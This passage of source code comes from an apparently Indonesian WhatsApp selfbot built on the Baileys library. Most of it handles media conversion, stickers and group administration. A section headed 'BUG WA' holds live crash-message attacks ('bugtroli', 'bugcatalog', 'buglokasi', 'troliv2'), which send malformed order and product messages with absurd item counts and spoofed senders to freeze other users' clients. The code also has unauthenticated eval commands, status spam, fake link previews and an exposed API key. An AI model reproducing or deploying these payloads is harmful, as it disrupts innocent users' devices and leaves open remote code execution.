                if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                reply('*okey wait..*')
                console.log('succes archive chat = ' + from)
                await sleepp(3000)
                Repor.modifyChat(from, ChatModification.archive)
                break
            case prefix+ 'delthischat':
                if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                reply('*succes delete this chat*')
                console.log('succes delete chat = ' + from)
                await sleepp(4000)
                Repor.modifyChat(from, ChatModification.delete)
                break
                
                case prefix+ 'shutdown':
                if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
	        await Repor.sendMessage(from, `Bye...\n_Gw off dulu yaa.._`, text,{quoted : ftoko})
		await sleepp(3000)
                Repor.close()
		break
		
		case prefix+ 'demoteall':
		if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                Repor.groupDemoteAdmin(from, members_id)
                break
                case prefix+ 'teruskan':
Repor.sendMessage(from, `${body.slice(9)}`, MessageType.text, {contextInfo: { forwardingScore: 210, isForwarded: true }})
            break
            case prefix+ 'on':
            if (!isOwner && !revz.key.fromMe) return 
            offline = false
            fakestatus(' ``ANDA TELAH ONLINE``` ')
            break
            case prefix+ 'off':
            if (!isOwner && !revz.key.fromMe) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
            fakestatus(' ```ANDA TELAH OFFLINE``` ')
            break  
            if (budy.startsWith('>')){
try {
	if (!revz.key.fromMe) return fakevn('```OWNER ONLY```')
return Repor.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: ftoko})
} catch(err) {
e = String(err)
reply(e)
}
}  
           /* case prefix+ '>':
            if (!isOwner && !revz.key.fromMe) return('_Lu Siapa?_')
const axios = require('axios')
var konsol = args.join(' ')
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log(konsol)
break*/
					//**************VIDEO SETTING***********///
					
						case prefix+ 'tomp3':
						
		            if (!isQuotedVideo) return reply('```Reply videonya!```')
		            reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await Repor.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return ftoko(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            Repor.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: fakevn })
		           fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'fastt':
		    
		            if (!isQuotedVideo) return fakevn('Reply videonya!')
		            fakevn(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await Repor.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakevn(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            Repor.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: revz })
		            fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'slow':
		    
		            if (!isQuotedVideo) return fakevn('Reply videonya!')
		            reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await Repor.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakevn(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            Repor.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: revz })
		            fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'reverse':
		    
		            if (!isQuotedVideo) return fakevn('```Reply videonya!```')
		                        reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await Repor.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakevn(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            Repor.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: revz })
		            fs.unlinkSync(ran)
		            })
		            break	
		            
           case prefix+ 'mirror':
           
		            if (!isQuotedVideo) return fakevn('```Reply videonya!```')
		                        reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await Repor.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter:v "split [main][tmp]; [tmp] crop=iw:ih/2:0:0, vflip [flip]; [main][flip] overlay=0:H/2" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakevn(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            Repor.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: revz })
		            fs.unlinkSync(ran)
		            })
		            break	
		            
		            case prefix+ 'ocr': 
					if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : revz
					const media = await Repor.downloadAndSaveMediaMessage(encmedia)
				reply('[❗] LOADING!')
					await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
		    		.then(teks => {
					reply(teks.trim())
					fs.unlinkSync(media)
					})
					.catch(err => {
					reply(err.message)
					fs.unlinkSync(media)
							})
					} else {
						reply(`*Kirim foto dengan caption ${prefix}ocr*`)
					}
					break
		           
		           case prefix+ 'hitamputih':
		           
		            if (!isQuotedVideo) return fakevn('```Reply videonya!```')
		                        reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await Repor.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -y -i ${media} -strict experimental -vf hue=s=0 -vcodec mpeg4 -b 2097152 -r 30 ${ran} `, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakevn(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            Repor.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: revz })
		            fs.unlinkSync(ran)
		            })
		            break	
		            
		            case prefix+ 'nosound':
		            
		            
		            if (!isQuotedVideo) return fakevn('```Reply videonya!```')
		                        fakevn(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await Repor.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -vcodec copy -an ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakevn(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            Repor.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: revz })
		            fs.unlinkSync(ran)
		            })
		            break	
		            
		            
			  //********** SETTING BOT **********//
			  case prefix+ 'setleave':
			  
			    if (args.length < 1) return reply('*Teks nya mana gan?*')
                    Repor.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					leave = body.slice(10)
					Repor.sendMessage(from,`\`\`\`Leave berhasil di ubah menjadi : ${body.slice(10)}\`\`\``, text,{quoted : revz})
				break 
				
				case prefix+ 'setpromote':
				
				  if (args.length < 1) return reply('*Teks nya mana gan?*')
                    Repor.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					promote = body.slice(11)
					Repor.sendMessage(from,`\`\`\`Promote berhasil di ubah menjadi : ${body.slice(11)}\`\`\``, text,{quoted : revz})
				break 
				
					case prefix+ 'setdemote':
					
					  if (args.length < 1) return reply('*Teks nya mana gan?*')
                    Repor.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					demote = body.slice(11)
					Repor.sendMessage(from ,`\`\`\`Demote berhasil di ubah menjadi : ${body.slice(11)}\`\`\``, text,{quoted : revz})
				break 
				
				case prefix+ 'setbodymenu':
				
				  if (args.length < 1) return reply('*_CONTOH :_*\n\n  *   : *menu*\n  ~   : ~menu~\n  _ : _menu_\n ```   : ```menu```\n\n\n\n Contoh penggunaan : .setbodymenu *')
                    Repor.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					f = body.slice(13)
					Repor.sendMessage(from ,`\`\`\`Body menu berhasil di ubah menjadi : ${body.slice(13)}\`\`\``, text,{quoted : revz})
				break 
				
					case prefix+ 'setwelcome':
					  if (args.length < 1) return reply('*Teks nya mana gan?*')
                    Repor.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					join = body.slice(11)
					Repor.sendMessage(from ,`\`\`\`Welcome berhasil di ubah menjadi : ${body.slice(11)}\`\`\``, text,{quoted : revz})
				break 
				
			  case prefix+ 'setreply':
			  case prefix+ 'setfake':
			    if (args.length < 1) return reply('*Teks nya mana gan?*')
                    Repor.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					fake = body.slice(10)
					Repor.sendMessage(from, `reply berhasil di ubah menjadi : ${fake}`,text,{quoted : revz})
				break 
				
				case prefix+ 'setfreply':
				if (!isQuotedImage) return reply('Reply imagenya')
				svst = body.slice(8)
				boij = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Repor.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./media/fakenya.jpeg`, delb)
				fs.writeFileSync('./media/freply.json', JSON.stringify(imagenye))
				Repor.sendMessage(from, `\`\`\`Sukses Mengganti Fakreply\`\`\``, MessageType.text, { quoted: revz })
				break

case prefix+ 'setthumb':
if(!isOwner) return reply('Lo Siapa?')
				if (!isQuotedImage) return reply('Reply imagenya')
				svst = body.slice(8)
				boij = JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Repor.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./media/logo.jpeg`, delb)
				fs.writeFileSync('./media/img.json', JSON.stringify(imagenye))
				Repor.sendMessage(from, `\`\`\`Sukses Mengganti Thumbnail\`\`\``, MessageType.text, { quoted: revz })
				break
				
				case prefix+ 'getbio':
                var yy = revz.message.extendedTextMessage.contextInfo.mentionedJid[0]
                var p = await Repor.getStatus(`${yy}`, MessageType.text)
                reply(p.status)
                if (p.status == 401) {
                reply("Status Profile Not Found")
                }
                break
				
				case prefix+ 'getpic':
				if (revz.message.extendedTextMessage != undefined){
					mentioned = revz.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await Repor.getProfilePicture(mentioned[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					thumb = await getBuffer(pic)
					Repor.sendMessage(from, thumb, MessageType.image)
				{quoted : revz}}
				break
				
				  case prefix+ 'join':
				if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
                           if (!q) return reply('Masukan link group')
                           var codeInvite = body.slice(6).split('https://chat.whatsapp.com/')[1]
                           if (!codeInvite) return fakevn ('pastikan link sudah benar!')
                           var response = await Repor.acceptInvite(codeInvite);
                           console.log(response);
                           break
                           
        //********** SYSTEM **********//
        
        case prefix+ 'return':
                                case prefix+ 'run':
                                        return fakevn(JSON.stringify(eval(args.join(''))))
                                        break
			     case prefix+ '.':
                        let code = args.join(" ")
                    try {
    
                    if (!code) return Repor.reply(from, 'No JavaScript Code', id)
                    let evaled;
    
                    if (code.includes("--silent") && code.includes("--async")) {
                    code = code.replace("--async", "").replace("--silent", "");
    
                    return await eval(`(async () => { ${code} })()`)
                    } else if (code.includes("--async")) {
                    code = code.replace("--async", "");
            
                    evaled = await eval(`(async () => { ${code} })()`);
                    } else if (code.includes("--silent")) {
                    code = code.replace("--silent", "");
            
                    return await eval(code);
                    } else evaled = await eval(code);
    
                  if (typeof evaled !== "string")
                evaled = require("util").inspect(evaled, { depth: 0 });
      
                let output = clean(evaled);
                var options = {
                    contextInfo: {
                        participant: '0@s.whatsapp.net',
                        quotedMessage: {
                            extendedTextMessage: {
                                text: "z a m  b o t"
                            }
                        }
                    }
                }
                Repor.sendMessage(from, `${output}`, text, options)
                } catch(err) {
                console.error(err)
                reply(err)
                }
                function clean(text) {
                if (typeof text === "string")
                  return text
                    .replace(/`/g, `\`${String.fromCharCode(8203)}`)
                    .replace(/@/g, `@${String.fromCharCode(8203)}`);
                // eslint-disable-line prefer-template
                else return text;
                }
                break
                
             case 'bc':
					Repor.updatePresence(from, Presence.composing)
					if (!isOwner && !revz.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Teksnya?')
					anu = await Repor.chats.all()
					if (isMedia && !revz.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
						buff = await Repor.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Repor.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !revz.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
						buff = await Repor.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Repor.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !revz.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
						buff = await Repor.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Repor.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: ftoko, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break
					case 'spamsw':
if (!isOwner && !revz.key.fromMe) return reply(mess.only.ownerB)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					Repor.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
				
				case prefix+ 'blocklist':
				  case prefix+ 'listblock':
					teks = 'This is list of blocked number :\n'
					for (let block of blocked) {
						teks += `┣❥  @${block.split('@')[0]}\n`
					}
					teks += `Total : ${blocked.length}`
					Repor.sendMessage(from, teks.trim(), extendedText, {quoted: revz, contextInfo: {"mentionedJid": blocked}})
					break
					
					
					//********** CONVERT **********//
					case prefix+ 'exif':
	        if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
	        if (args.length < 1) return reply(`Penggunaan ${prefix}exif nama|autho`)
		if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
		    exif.create(arg.split('|')[0], arg.split('|')[1])
		    reply('sukses')
	        break
	     //**************************BUG WA*****************//
	     case prefix+'bugtroli':
              if (!isOwner && !revz.key.fromMe) return reply(mess.only.ownerB)
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
Repor.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: fakeimage,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️ZamBug☠️',
    orderTitle: 'ZamBug', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
Repor.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(revz.key.remoteJid)
break

  case prefix+'bugstick':
            if ((isMedia && !revz.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
            file = await Repor.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            ini_buffer = fs.readFileSync(file)
            virgam = fs.readFileSync(`./media/virgam.jpeg`),
               Repor.sendMessage(from, ini_buffer, sticker, {thumbnail : virgam})
            fs.unlinkSync(file)
           }
            break
case prefix+'bugsw':
if(isQuotedImage){
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
						buffer = await Repor.downloadMediaMessage(encmedia)
							virgam = fs.readFileSync(`./media/virgam.jpeg`),
							Repor.sendMessage(from, buffer, image, {quoted: revz, thumbnail:virgam, caption: '🥵BUG SW READY🥵'})
							}
					break

case prefix+ 'bugkatalog':
case prefix+ 'bugcatalog':
if(isQuotedImage) {
   const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
						buff = await Repor.downloadMediaMessage(encmedia)
					weem = args.join(" ")
imeu = await Repor.prepareMessage('0@s.whatsapp.net',buff,image)
imeg = imeu.message.imageMessage
res = await Repor.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": weem,
"description": ngazap(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "994404819287@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  Repor.relayWAMessage(res)
  Repor.toggleDisappearingMessages(from,`Ups :v`,text)
 } 
  break
                case prefix+'bugweb':
                if (!isOwner && !revz.key.fromMe) return reply(mess.only.ownerB)
                 Repor.toggleDisappearingMessages(from, 0)
                name = args.join(" ")
               Repor.sendMessage(from, ngazap(prefix), text, { quoted:ftoko, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${vapi(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/480S7QL/revz.png",
                "thumbnail": fs.readFileSync(`./media/virgam.jpeg`),
                "sourceUrl": "https://instagram.com/xnoob_ganz"}}})
                break

case prefix+'buglokasi':
if (!isOwner && !revz.key.fromMe) return reply(mess.only.ownerB)
Repor.updatePresence(from, Presence.composing)
namelu = args.join(" ")
		       Repor.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${namelu}`,
						address: `${ngazap(prefix)}`,
                        jpegThumbnail: fakeimage },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `NizamGanz`,
    orderTitle: `Z A M  B O T`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break

     
            case prefix+'troliv2':
            if(!revz.key.fromMe) return reply('Lu Siapa?')
            let kontol = Repor.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 292919, "thumbnail": fs.readFileSync(`./media/virgam.jpeg`), "surface": 'CATALOG' }}, {quoted:revz})
            Repor.relayWAMessage(kontol, {waitForAck: true})
            break
            
             
             case prefix+'👍':
	case prefix+'buggc':
Repor.toggleDisappearingMessages(from, `MODAR`, text)
Repor.toggleDisappearingMessages(from, `MODAR`, text)
					break
	       /////////////////END BUG WEA///////////////
	       
	       
	        case prefix+ 'colong':
		if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await Repor.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    Repor.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: revz})
					fs.unlinkSync(media)
					fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
				})
				break
	        
					case prefix+ 'take':
					
					if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}takestick nama|author*`)
					var pembawm = body.slice(6)
					var encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var media = await Repor.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					var packname = pembawm.split('|')[0]
					var author = pembawm.split('|')[1]
					exif.create(packname, author, `takestick_${sender}`)
					exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
					if (error) return reply('Error')
					Repor.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: revz})
					fs.unlinkSync(media)
					fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
				})
				break
				
				case prefix+ 'togif':
				
                                        if (!isQuotedSticker) return reply('Reply stiker nya')
                                        reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
                                        if (revz.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
                                        const encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        const media = await Repor.downloadAndSaveMediaMessage(encmedia)
                                        const upload = await uploadimg(media, Date.now() + '.webp')
                                        const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
                                        const buff = await getBuffer(rume.data.result)
                                        Repor.sendMessage(from, buff, video, { mimetype: Mimetype.gif, caption: 'Nih', quoted: revz})
                                }
                                break
				
				case prefix+ 'tovideo':
				case prefix+ 'tovid':
				
                    if ((isMedia && !revz.message.videoMessage || isQuotedSticker)) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
                        filePath = await Repor.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".gif")
                        ini_txt = args.join(" ").split("|")
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/togif?apikey=${LolKey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            Repor.sendMessage(from, Ini_buff, video, { quoted: revz, mimetype: "video/gif", filename: file_name }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
					
					case prefix+ 'fdeface':
					
					var nn = body.slice(9)
					var urlnye = nn.split("|")[0];
					var titlenye = nn.split("|")[1];
					var descnye = nn.split("|")[2];
					//imgbbb = require('imgbb-uploader')
					//run = getRandom('.jpeg')
					//encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
					//media = await Repor.downloadAndSaveMediaMessage(encmedia)
					ddatae = await imageToBase64(JSON.stringify('./media/fakenya.jpeg').replace(/\"/gi, ''))

					Repor.sendMessage(from, {

						text: `${urlnye}`,

						matchedText: `${urlnye}`,

						canonicalUrl: `${urlnye}`,

						description: `${descnye}`,

						title: `${titlenye}`,

						jpegThumbnail: ddatae
					}, 'extendedTextMessage', { detectLinks: false })
					break
					
					case prefix+ 'nobg':
					
if ((isMedia && !revz.videoMessage || isQuotedImage)) {
    reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : revz
var media = await Repor.downloadAndSaveMediaMessage(encmedia)
anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
getUrl = `${anu.display_url}`
buff = await getBuffer(`https://api.zeks.xyz/api/removebg?apikey=apivinz&url=${getUrl}`)
Repor.sendMessage(from, buff, image, {quoted: revz})
}
break
					
					
                    
                    case prefix+ 'rs':
                      case prefix+ 'rsticker':
                      
                    if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await Repor.downloadAndSaveMediaMessage(encmedia)
                        file_name = getRandom('.webp')
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/towebpwround?apikey=${LolKey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath)
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            Repor.sendMessage(from, ini_buff, sticker, { quoted: revz}).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
                    }
                    break
                    
                    case prefix+ 'swm':
                    case prefix+ 'stickerwm':
                    
                    if ((isMedia && !revz.message.videoMessage || isQuotedImage)) {
                        if (args.length == 0) return reply(`Example: ${prefix + command} Repor|Rapayee`)
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await Repor.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".webp")
                        ini_txt = args.join(" ").split("|")
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${LolKey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                                "package": ini_txt[0],
                                "author": ini_txt[1]
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            Repor.sendMessage(from, ini_buff, sticker, { quoted: revz }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
                    
				case prefix+ 's':
				case prefix+ 'sticker':
				case prefix+ 'stiker':
				
					if ((isMedia && !revz.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : revz
						const media = await Repor.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								Repor.sendMessage(from, buff, sticker, {quoted: revz})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
